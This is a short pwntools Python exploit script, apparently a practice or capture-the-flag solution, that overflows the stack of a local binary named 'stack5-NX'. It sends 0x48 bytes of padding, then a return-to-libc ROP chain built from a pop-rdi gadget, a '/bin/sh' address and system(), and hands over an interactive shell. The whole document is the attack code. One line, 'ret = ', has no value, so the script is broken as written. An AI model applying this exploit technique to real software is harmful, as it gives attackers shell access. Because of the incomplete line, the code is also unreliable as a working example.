from pwn import *

p = process('./stack5-NX')

pop_rdi_ret = 0x40100b
binsh = 0x7ffff7dcb42f
ret = 
libc_system = 0x7ffff7c58750

payload = b'A' * 0x48
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)

p.recvline()
p.sendline(payload)

p.interactive()